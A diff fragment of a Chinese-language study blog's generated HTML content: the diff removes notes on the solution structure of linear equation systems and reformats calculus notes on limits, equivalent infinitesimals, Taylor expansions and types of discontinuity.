-<p><strong>推论2</strong> 设 A 是 n 阶矩阵，则<br>(1) 非齐次线性方程组 $AX=b$ 有解的充分必要条件是 $r(A)=r(\overline{A})$，其中当$|A|\ne0$时，方程组有唯一解；当$|A|=0$时，方程组有无数个解<br>(2)非齐次线性方程组 $AX=b$ 无解的充分必要条件是 $r(A)\ne r(\overline{A})$<br>(3 设$A_{m\times n}$，若$r(A)=m$(即行满秩)，则非齐次线性方程组$Ax=b$有解。事实上，此时$r(A)=r(A,b)=m$，所以$Ax=b$有解<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理2.1.png" alt="图片"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/线性方程定理22.png" alt="图片"></p>
-<h3 id="线性方程组解的结构"><a href="#线性方程组解的结构" class="headerlink" title="线性方程组解的结构"></a>线性方程组解的结构</h3><ol>
-<li>设 $X_1,X_2,\dotsb,X_s$ 为齐次线性方程组 $AX=0$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s$ 也为齐次线性方程组 $AX=0$ 的解，其中 $k_1,k_2,\dotsb,k_s$ 为任意常数</li>
-<li>设 $\eta_0$ 为非齐次线性方程组 $AX=b$ 的一个解，$X_1,X_2,\dotsb,X_s$ 为齐次线性方程组 $AX=0$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s+\eta_0$ 为非齐次线性方程组 $AX=b$ 的解</li>
-<li>设 $\eta_1,\eta_2$ 为非齐次线性方程组 $AX=b$ 的两个解，则 $\eta_2-\eta_1$ 为齐次线性方程组 $AX=0$ 的一个解</li>
-<li>设 $\xi$ 是方程组 $Ax=b$ 的解，$\eta$ 是导出组 $Ax=0$ 的解，k 是任意常数，则 $\xi+k\eta$ 是方程组 $Ax=b$ 的解</li>
-<li>设 $X_1,X_2,\dotsb,X_s$ 为非齐次线性方程组 $AX=b$ 的一组解，则 $k_1X_1+k_2X_2+\dotsb+k_sX_s$ 为 $AX=b$ 的解的充分必要条件是 $k_1+k_2+\dotsb+k_s=1$</li>
-<li>设 $\eta_1,\eta_2,\dotsb,\eta_s$ 为非齐次线性方程组 $AX=b$ 的一组解，则 $k_1\eta_1+k_2\eta_2+\dotsb+k_s\eta_s$ 为齐次线性方程组 $AX=0$ 的解的充分必要条件是 $k_1+k_2+\dotsb+k_s=0$</li>
-</ol>
-<h3 id="线性方程组的通解"><a href="#线性方程组的通解" class="headerlink" title="线性方程组的通解"></a>线性方程组的通解</h3><h4 id="齐次线性方程组-AX-0-的基础解系与通解"><a href="#齐次线性方程组-AX-0-的基础解系与通解" class="headerlink" title="齐次线性方程组 $AX=0$ 的基础解系与通解"></a>齐次线性方程组 $AX=0$ 的基础解系与通解</h4><ol>
-<li><p>基础解系——设$r(A)=r&lt;n$，则$AX=0$所有解构成的解向量组的极大线性无关组成为方程组$AX=0$的一个基础解系。当$r(A)=r$时，$AX=0$的基础解系所含的线性无关的解向量的个数为$n-r$个</p>
-<pre><code> 设A为$m\times n$矩阵，且$r(A)=r&lt;n$,所谓$AX=0$的基础解系，即满足如下三个条件的向量组
- (1)该向量组中每个向量都是$AX=0$的解；
- (2)该向量组线性无关；
- (3)该向量组所含解向量的个数等于$nーr$
-</code></pre></li>
-<li><p>通解——设$\xi_1,\xi_2,\dotsb,\xi_{n-r}$为齐次线性方程组$AX=0$的一个基础解系，则称$k\xi_1+k_2\xi_2+\dotsb+k_{n-r}\xi_{n-r}$为齐次线性方程组$AX=0$的通解，其中$k_1,k_2,\dotsb,k_{n-r}$为任意常数</p>
-</li>
-</ol>
-<h4 id="非齐次线性方程组-AX-b-的通解"><a href="#非齐次线性方程组-AX-b-的通解" class="headerlink" title="非齐次线性方程组 $AX=b$的通解"></a>非齐次线性方程组 $AX=b$的通解</h4><p>设$r(A)=r(\overline{A})=r&lt;n$且$\xi_1,\xi_2,\dotsb,\xi_{n-r}$为$AX=b$的导出方程组$AX=0$的一个基础解系，$\eta_0$为$AX=b$的一个解，则$AX=b$的通解为$k\xi_1+k_2\xi_2+\dotsb+k_{n-r}\xi_{n-r}+\eta_0$，其中$k_1,k_2,\dotsb,k_{n-r}$为任意常数<br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%BA%BF%E6%80%A7%E6%96%B9%E7%A8%8B%E7%BB%84/非线性方程组通解注解.png" alt="图片"></p>
-<h3 id="方程组解的理论延伸"><a href="#方程组解的理论延伸" class="headerlink" title="方程组解的理论延伸"></a>方程组解的理论延伸</h3><ol>
-<li>设 $A$ 是 $m\times n$矩阵，B是$n\times s$矩阵，若$AB=0$，则B的列向量组为方程组$AX=0$的解</li>
-<li>设方程组$AX=0$与$BX=0$为同解方程组，则$r(A)=r(B)$,反之不对</li>
-<li>设方程组$AX=0$的解为$BX=0$的解，则$r(A)\ge r(B)$<br> 1.若方程组$AX=0$的解为方程组$BX=0$的解，但方程组$BX=0$的解不全是方程组$AX=0$的解，则$r(A)&gt;r(B)$<br> 2.若方程纽$AX=0$的解为方程组$BX=0$的解，且$r(A)=r(B)$,则方程组$AX=0$与方程组$BX=0$同解</li>
-<li>设<script type="math/tex">AX=b\tag{I}$$$$BX=c\tag{II}</script>则线性方程组$(\overset{A}{B})X=(\overset{b}{c})$的解即为线性方程组(I)和(II)的解</li>
-</ol>
-]]></content>
       <categories>
         <category>数学</category>
       </categories>
@@ -3323,7 +3323,7 @@ A+(-A)=O</script></li>
 </ol>
 <h4 id="无穷大与无界变量的关系-无穷大-Rightarrow-无界变量"><a href="#无穷大与无界变量的关系-无穷大-Rightarrow-无界变量" class="headerlink" title="无穷大与无界变量的关系 无穷大$\Rightarrow$ 无界变量"></a>无穷大与无界变量的关系 无穷大$\Rightarrow$ 无界变量</h4><p>数列${x_n}$是无穷大量：$\forall M&gt;0,\exists N$，当$n&gt;N$时，恒有$|x_n|&gt;M$<br>数列${x_n}$是无界变量：$\forall M&gt;0,\exists N$,使$|x_N|&gt;M$<br>无穷大量一定是无界变量，但无界变量不一定是无穷大量(例：$f(x)=\begin{cases}<br>   n ,n为奇数 \\<br>   0 ,n为偶数 \\<br>\end{cases}$)</p>
 <h4 id="无穷大量与无穷小量的关系"><a href="#无穷大量与无穷小量的关系" class="headerlink" title="无穷大量与无穷小量的关系"></a>无穷大量与无穷小量的关系</h4><p>在自变量的同一变化过程中，若$f(x)$是无穷大，则$\frac{1}{f(x)}$是无穷小；若$f(x)$是无穷小，且$f(x)\ne0$，则$\frac{1}{f(x)}$是无穷大</p>
-<h3 id="求极限的方法"><a href="#求极限的方法" class="headerlink" title="求极限的方法"></a>求极限的方法</h3><h4 id="利用有理运算法则求极限"><a href="#利用有理运算法则求极限" class="headerlink" title="利用有理运算法则求极限"></a>利用有理运算法则求极限</h4><p>若$\lim f(x)=A,\lim g(x)=B$，则$\lim[f(x)\pm g(x)]=\lim f(x)\pm\lim g(x)=A\pm B;\lim[f(x)\cdot g(x)]=\lim f(x)\cdot\lim g(x)=A\cdot B;\lim\frac{f(x)}{g(x)}=\frac{\lim f(x)}{\lim g(x)}=\frac{A}{B}(B\ne0)$</p>
+<h3 id="求极限的方法"><a href="#求极限的方法" class="headerlink" title="求极限的方法"></a>求极限的方法</h3><h4 id="利用有理运算法则求极限"><a href="#利用有理运算法则求极限" class="headerlink" title="利用有理运算法则求极限"></a>利用有理运算法则求极限</h4><p>若$\lim f(x)=A,\lim g(x)=B$，则<br>$\lim[f(x)\pm g(x)]=\lim f(x)\pm\lim g(x)=A\pm B;\lim[f(x)\cdot g(x)]=\lim f(x)\cdot\lim g(x)=A\cdot B;\lim\frac{f(x)}{g(x)}=\frac{\lim f(x)}{\lim g(x)}=\frac{A}{B}(B\ne0)$</p>
 <p>推论：</p>
 <ol>
 <li>若$\lim f(x)=A\ne0$，则$\lim f(x)g(x)=A\lim g(x);\lim\frac{g(x)}{f(x)}=\frac{1}{A}\lim g(x)$</li>
@@ -3332,21 +3332,55 @@ A+(-A)=O</script></li>
 </ol>
 <p>注：<br>若$\lim f(x)$存在，$\lim g(x)$不存在，则$\lim[f(x)\pm g(x)]$一定不存在<br>若$\lim f(x)$和$\lim g(x)$都不存在，则$\lim[f(x)\pm g(x)]$不一定存在</p>
 <h4 id="利用基本极限求极限"><a href="#利用基本极限求极限" class="headerlink" title="利用基本极限求极限"></a>利用基本极限求极限</h4><p>常用的基本极限</p>
-<p>$\sin x<x<\tan x,x\in(0,\frac{\pi}{2}$ $\frac{x}{1+x}<\ln(1+x)<x,x\in(0,+\infty)$ $\lim\limits_{x\rightarrow0}\frac{\sin x}{x}="1;\lim\limits_{x\rightarrow0}(1+x)^{\frac{1}{x}}=e;\lim\limits_{x\rightarrow\infty}(1+\frac{1}{x})^x=e$" $\lim\limits_{x\rightarrow0}\frac{a^x-1}{x}="\ln" a(a>0);\lim\limits_{n\rightarrow\infty}\sqrt[n]{n}=1$<br>$\lim\limits_{x\rightarrow\infty}\frac{a_nx^n+a_{n-1}x^{n-1}+\dotsb+a_1x+a_0 }{b_mx^m+b_{m-1}x^{m-1}+\dotsb+b_1x+b_0}=\begin{cases}<br>   \frac{a_n}{b_n},n=m\\<br>   0,n<m\\ \infty,n>m<br>\end{cases}$<br>$\lim\limits_{n\rightarrow\infty} x^n=\begin{cases}<br>   0,|x|<1 \\ \infty, |x|>1 \\<br>   1, x=1 \\<br>   不存在, x=-1<br>\end{cases};\lim\limits_{n\rightarrow\infty} e^{nx}=\begin{cases}<br>   0,x<0 \\ +\infty, x>0 \\<br>   1, x=0<br>\end{cases}$</0></1></m\\></x<\tan></p>
-<h5 id="利用等价无穷小代换求极限"><a href="#利用等价无穷小代换求极限" class="headerlink" title="利用等价无穷小代换求极限"></a>利用等价无穷小代换求极限</h5><p>常用等价无穷小<br>当$x\rightarrow0$时<br>(1) $x\sim\sin x\sim\tan x\sim\arcsin x\sim\arctan x\sim\ln(1+x)\sim e^e-1,(1+x)^a-1\sim ax,1-\cos x\sim\frac{1}{2}x^2,a^x-1\sim x\ln a,1-\cos^\alpha x\sim\frac{\alpha}{2}x^2$<br>(2) $x-\sin x\sim\frac{x^3}{6},\arcsin x-x\sim\frac{x^3}{6},x-\ln(1+x)\sim\frac{x^2}{2},\tan x-x\sim\frac{x^3}{3},x-\arctan x\sim\frac{x^3}{3}$，若$\alpha(x)\rightarrow0,\alpha(x)\beta(x)\rightarrow0$，则$(1+\alpha(x))^{\beta(x)}-1\sim\alpha(x)\beta(x)$<br>(3) 设f(x)和g(x)在x=0的某邻域内连续，且$\lim\limits\frac{f(x)}{g(x)}=1$，则$\int_0^xf(t)dt\sim\int_0^xg(t)dt$</p>
+<p>$\sin x&lt;x&lt;\tan x,x\in(0,\frac{\pi}{2})$</p>
+<p>$\frac{x}{1+x}&lt;\ln(1+x)&lt;x,x\in(0,+\infty)$</p>
+<p>$\lim\limits_{x\rightarrow0}\frac{\sin x}{x}=1;\lim\limits_{x\rightarrow0}(1+x)^{\frac{1}{x}}=e;\lim\limits_{x\rightarrow\infty}(1+\frac{1}{x})^x=e$</p>
+<p>$\lim\limits_{x\rightarrow0}\frac{a^x-1}{x}=\ln a(a&gt;0);\lim\limits_{n\rightarrow\infty}\sqrt[n]{n}=1$</p>
+<script type="math/tex; mode=display">\lim\limits_{x\rightarrow\infty}\frac{a_nx^n+a_{n-1}x^{n-1}+\dotsb+a_1x+a_0 }{b_mx^m+b_{m-1}x^{m-1}+\dotsb+b_1x+b_0}=\begin{cases}
+   \frac{a_n}{b_n},n=m\\
+   0,n<m\\
+   \infty,n>m
+\end{cases}</script><script type="math/tex; mode=display">\lim\limits_{n\rightarrow\infty} x^n=\begin{cases}
+   0,|x|<1 \\
+   \infty, |x|>1 \\
+   1, x=1 \\
+   不存在, x=-1
+\end{cases};\lim\limits_{n\rightarrow\infty} e^{nx}=\begin{cases}
+   0,x<0 \\
+   +\infty, x>0 \\
+   1, x=0
+\end{cases}</script><h5 id="利用等价无穷小代换求极限"><a href="#利用等价无穷小代换求极限" class="headerlink" title="利用等价无穷小代换求极限"></a>利用等价无穷小代换求极限</h5><p>常用等价无穷小<br>当 $x\rightarrow0$ 时</p>
+<p>(1) $x\sim\sin x\sim\tan x\sim\arcsin x\sim\arctan x\sim\ln(1+x)\sim e^x-1,(1+x)^a-1\sim ax,1-\cos x\sim\frac{1}{2}x^2$，$a^x-1\sim x\ln a,1-\cos^\alpha x\sim\frac{\alpha}{2}x^2$</p>
+<p>(2) $x-\sin x\sim\frac{x^3}{6},\arcsin x-x\sim\frac{x^3}{6},x-\ln(1+x)\sim\frac{x^2}{2},\tan x-x\sim\frac{x^3}{3},x-\arctan x\sim\frac{x^3}{3}$，若$\alpha(x)\rightarrow0,\alpha(x)\beta(x)\rightarrow0$，则$(1+\alpha(x))^{\beta(x)}-1\sim\alpha(x)\beta(x)$</p>
+<p>(3) 设f(x)和g(x)在x=0的某邻域内连续，且$\lim\limits\frac{f(x)}{g(x)}=1$，则$\int_0^xf(t)dt\sim\int_0^xg(t)dt$</p>
 <p>等价无穷小代换的原则</p>
-<p>1）乘、除关系可以换<br>若$\alpha\sim\alpha_1,\beta\sim\beta_1$，则$\lim\limits\frac{\alpha}{\beta}=\lim\limits\frac{\alpha_1}{\beta}=\lim\limits\frac{\alpha}{\beta_1}=\lim\limits\frac{\alpha_1}{\beta_1}$<br>2）加、减关系在一定条件下可以换<br>(1) 若$\alpha\sim\alpha_1,\beta\sim\beta_1$，且$\lim\limits\frac{\alpha_1}{\beta_1}=A\ne1$，则$\alpha-\beta\sim\alpha_1-\beta_1$<br>(2) 若$\alpha\sim\alpha_1,\beta\sim\beta_1$，且$\lim\limits\frac{\alpha_1}{\beta_1}=A\ne-1$，则$\alpha+\beta\sim\alpha_1+\beta_1$</p>
-<h5 id="利用洛必达法则求极限"><a href="#利用洛必达法则求极限" class="headerlink" title="利用洛必达法则求极限"></a>利用洛必达法则求极限</h5><p>若<br>(1) $\lim\limits_{x\rightarrow x_0}f(x)=\lim\limits_{x\rightarrow x_0}g(x)=0(\infty)$;<br>(2) f(x)和g(x)在$x_0$的某去心邻域内可导，且$g’(x)\ne0$<br>(3) $\lim\limits_{x\rightarrow x_0}\frac{f’(x)}{g’(x)}$存在(或$\infty$)<br>则$\lim\limits_{x\rightarrow x_0}\frac{f(x)}{g(x)}=\lim\limits_{x\rightarrow x_0}\frac{f’(x)}{g’(x)}$</p>
+<p>1）乘、除关系可以换<br>若$\alpha\sim\alpha_1,\beta\sim\beta_1$，则$\lim\limits\frac{\alpha}{\beta}=\lim\limits\frac{\alpha_1}{\beta}=\lim\limits\frac{\alpha}{\beta_1}=\lim\limits\frac{\alpha_1}{\beta_1}$</p>
+<p>2）加、减关系在一定条件下可以换<br>(1) 若$\alpha\sim\alpha_1,\beta\sim\beta_1$，且$\lim\limits\frac{\alpha_1}{\beta_1}=A\ne1$，则$\alpha-\beta\sim\alpha_1-\beta_1$</p>
+<p>(2) 若$\alpha\sim\alpha_1,\beta\sim\beta_1$，且$\lim\limits\frac{\alpha_1}{\beta_1}=A\ne-1$，则$\alpha+\beta\sim\alpha_1+\beta_1$</p>
+<h5 id="利用洛必达法则求极限"><a href="#利用洛必达法则求极限" class="headerlink" title="利用洛必达法则求极限"></a>利用洛必达法则求极限</h5><p>若<br>(1) $\lim\limits_{x\rightarrow x_0}f(x)=\lim\limits_{x\rightarrow x_0}g(x)=0(\infty)$;</p>
+<p>(2) f(x)和g(x)在$x_0$的某去心邻域内可导，且$g’(x)\ne0$</p>
+<p>(3) $\lim\limits_{x\rightarrow x_0}\frac{f’(x)}{g’(x)}$存在(或$\infty$)<br>则$\lim\limits_{x\rightarrow x_0}\frac{f(x)}{g(x)}=\lim\limits_{x\rightarrow x_0}\frac{f’(x)}{g’(x)}$</p>
 <h5 id="利用泰勒公式求极限"><a href="#利用泰勒公式求极限" class="headerlink" title="利用泰勒公式求极限"></a>利用泰勒公式求极限</h5><p>设$f(x)$在$x=x_0$处n阶可导，则<script type="math/tex">f(x)=f(x_0)+f'(x_0)(x-x_0)+\frac{f''(x_0)}{2!}(x-x_0)^2+\dotsb+\frac{f^{(n)}(x_0)}{n!}(x-x_0)^n+o((x-x_0)^n)</script><br>当$x_0=0$时</p>
 <script type="math/tex; mode=display">f(x)=f(0)+f'(0)x+\frac{f''(0)}{2!}x^2+\dotsb+\frac{f^{n}(0)}{n!}x^n+o(x^n)</script><p>常用的泰勒公式</p>
-<p>(1) $e^x=1+x+\frac{x^2}{2!}+\dotsb+\frac{x^n}{n!}+o(x^n)$<br>(2) $\sin x=x-\frac{x^3}{3!}+\dotsb+(-1)^{n-1}\frac{x^{2n-1}}{(2n-1)!}+o(x^{2n-1})$<br>(3) $\cos x=1-\frac{x^2}{2!}+\dotsb+(-1)^n\frac{x^{2n}}{(2n)!}+o(x^{2n})$<br>(4) $\ln(1+x)=x-\frac{x^2}{2}+\dotsb+(-1)^{n-1}\frac{x^n}{n}+o(x^n)$<br>(5) $(1+x)^a=1+ax+\frac{a(a-1)}{2!}x^2+\dotsb+\frac{a(a-1\dotsb(a-n+1))}{n!}x^n+o(x^n)$</p>
-<h5 id="利用夹逼准则求极限"><a href="#利用夹逼准则求极限" class="headerlink" title="利用夹逼准则求极限"></a>利用夹逼准则求极限</h5><h5 id="利用定积分的定义求极限"><a href="#利用定积分的定义求极限" class="headerlink" title="利用定积分的定义求极限"></a>利用定积分的定义求极限</h5><h5 id="利用单调有界准则求极限"><a href="#利用单调有界准则求极限" class="headerlink" title="利用单调有界准则求极限"></a>利用单调有界准则求极限</h5><h4 id="函数极限的题型"><a href="#函数极限的题型" class="headerlink" title="函数极限的题型"></a>函数极限的题型</h4><h5 id="frac-0-0-型极限"><a href="#frac-0-0-型极限" class="headerlink" title="$\frac{0}{0}$型极限"></a>$\frac{0}{0}$型极限</h5><p>(1) 洛必达法则<br>(2) 等价无穷小代换<br>(3) 泰勒公式</p>
-<h5 id="frac-infty-infty-型"><a href="#frac-infty-infty-型" class="headerlink" title="$\frac{\infty}{\infty}$型"></a>$\frac{\infty}{\infty}$型</h5><p>(1) 洛必达法则<br>(2) 分子分母同除以分子和分母各项中最高阶的无穷大</p>
-<h5 id="infty-infty-型极限"><a href="#infty-infty-型极限" class="headerlink" title="$\infty-\infty$型极限"></a>$\infty-\infty$型极限</h5><p>(1) 通分化为$\frac{0}{0}$(适用于分式差)<br>(2) 根式有理化<br>(3) 提无穷因子，然后等价代换或变量代换、泰勒公式</p>
-<h5 id="1-infty-型极限"><a href="#1-infty-型极限" class="headerlink" title="$1^\infty$型极限"></a>$1^\infty$型极限</h5><p>(1) 凑基本极限 $\lim[1+f(x)]^{\frac{1}{f(x)}}=e$，其中$\lim f(x)=0(f(x)\ne0)$<br>(2) 改写成指数 $\lim[f(x)]^{g(x)}=\lim e^{g(x)\ln f(x)}$，用洛必达法则<br>(3) 利用结论：若$\lim\alpha(x)=0,\lim\beta(x)=\infty,$且$\lim\alpha(x)\beta(x)=A$，则$\lim[1+\alpha(x)]^{\beta(x)}=e^A$</p>
+<p>(1) $e^x=1+x+\frac{x^2}{2!}+\dotsb+\frac{x^n}{n!}+o(x^n)$</p>
+<p>(2) $\sin x=x-\frac{x^3}{3!}+\dotsb+(-1)^{n-1}\frac{x^{2n-1}}{(2n-1)!}+o(x^{2n-1})$</p>
+<p>(3) $\cos x=1-\frac{x^2}{2!}+\dotsb+(-1)^n\frac{x^{2n}}{(2n)!}+o(x^{2n})$</p>
+<p>(4) $\ln(1+x)=x-\frac{x^2}{2}+\dotsb+(-1)^{n-1}\frac{x^n}{n}+o(x^n)$</p>
+<p>(5) $(1+x)^a=1+ax+\frac{a(a-1)}{2!}x^2+\dotsb+\frac{a(a-1\dotsb(a-n+1))}{n!}x^n+o(x^n)$</p>
+<h5 id="利用夹逼准则求极限"><a href="#利用夹逼准则求极限" class="headerlink" title="利用夹逼准则求极限"></a>利用夹逼准则求极限</h5><h5 id="利用定积分的定义求极限"><a href="#利用定积分的定义求极限" class="headerlink" title="利用定积分的定义求极限"></a>利用定积分的定义求极限</h5><h5 id="利用单调有界准则求极限"><a href="#利用单调有界准则求极限" class="headerlink" title="利用单调有界准则求极限"></a>利用单调有界准则求极限</h5><h4 id="函数极限的题型"><a href="#函数极限的题型" class="headerlink" title="函数极限的题型"></a>函数极限的题型</h4><h5 id="frac-0-0-型极限"><a href="#frac-0-0-型极限" class="headerlink" title="$\frac{0}{0}$ 型极限"></a>$\frac{0}{0}$ 型极限</h5><p>(1) 洛必达法则</p>
+<p>(2) 等价无穷小代换</p>
+<p>(3) 泰勒公式</p>
+<h5 id="frac-infty-infty-型"><a href="#frac-infty-infty-型" class="headerlink" title="$\frac{\infty}{\infty}$ 型"></a>$\frac{\infty}{\infty}$ 型</h5><p>(1) 洛必达法则</p>
+<p>(2) 分子分母同除以分子和分母各项中最高阶的无穷大</p>
+<h5 id="infty-infty-型极限"><a href="#infty-infty-型极限" class="headerlink" title="$\infty-\infty$ 型极限"></a>$\infty-\infty$ 型极限</h5><p>(1) 通分化为$\frac{0}{0}$(适用于分式差)</p>
+<p>(2) 根式有理化</p>
+<p>(3) 提无穷因子，然后等价代换或变量代换、泰勒公式</p>
+<h5 id="1-infty-型极限"><a href="#1-infty-型极限" class="headerlink" title="$1^\infty$ 型极限"></a>$1^\infty$ 型极限</h5><p>(1) 凑基本极限 $\lim[1+f(x)]^{\frac{1}{f(x)}}=e$，其中$\lim f(x)=0(f(x)\ne0)$</p>
+<p>(2) 改写成指数 $\lim[f(x)]^{g(x)}=\lim e^{g(x)\ln f(x)}$，用洛必达法则</p>
+<p>(3) 利用结论：若$\lim\alpha(x)=0,\lim\beta(x)=\infty,$且$\lim\alpha(x)\beta(x)=A$，则$\lim[1+\alpha(x)]^{\beta(x)}=e^A$</p>
 <h4 id="无穷小量的比较"><a href="#无穷小量的比较" class="headerlink" title="无穷小量的比较"></a>无穷小量的比较</h4><p>结论：若$f(x)$在$x=0$的某邻域内连续，且当$x\rightarrow0$时$f(x)$是$x$的$m$阶无穷小，$\varphi(x)$是$x$的$n$阶无穷小，则当$x\rightarrow0$时$F(x)=\int_0^{\varphi(x)}f(t)dt$是$x$的$n(m+1)$阶无穷小</p>
 <h2 id="连续"><a href="#连续" class="headerlink" title="连续"></a>连续</h2><h3 id="连续的概念"><a href="#连续的概念" class="headerlink" title="连续的概念"></a>连续的概念</h3><p>若$f(x)$在$x_0$某去心邻域有定义，但在$x_0$处不连续，则称点$x=x_0$为函数$f(x)$的间断点</p>
-<h3 id="间断点及其类型"><a href="#间断点及其类型" class="headerlink" title="间断点及其类型"></a>间断点及其类型</h3><p>(1) 第一类间断点：左、右极限均存在的间断点<br>可去间断点：左、右极限存在且相等的间断点<br>跳跃间断点：左、右极限都存在但不相等的间断点<br>(2) 第二类间断点：左、右极限中至少有一个不存在的间断点<br>无穷间断点：左、右极限中至少有一个为无穷，如$x=0$为$f(x)=\frac{1}{x}$的无穷间断点<br>震荡间断点：如$x=0$为$f(x)=\sin\frac{1}{x}$的震荡间断点 </p>
+<h3 id="间断点及其类型"><a href="#间断点及其类型" class="headerlink" title="间断点及其类型"></a>间断点及其类型</h3><p>(1) 第一类间断点：左、右极限均存在的间断点<br>可去间断点：左、右极限存在且相等的间断点<br>跳跃间断点：左、右极限都存在但不相等的间断点<br>(2) 第二类间断点：左、右极限中至少有一个不存在的间断点<br>无穷间断点：左、右极限中至少有一个为无穷，如$x=0$为$f(x)=\frac{1}{x}$的无穷间断点<br>震荡间断点：如$x=0$为$f(x)=\sin\frac{1}{x}$的震荡间断点</p>
 <h3 id="连续函数的性质"><a href="#连续函数的性质" class="headerlink" title="连续函数的性质"></a>连续函数的性质</h3><ol>
 <li>连续函数的和、差、积(分母不为零)仍复合连续</li>
 <li>基本初等函数在定义域内连续；初等函数在其定义区间内连续</li>
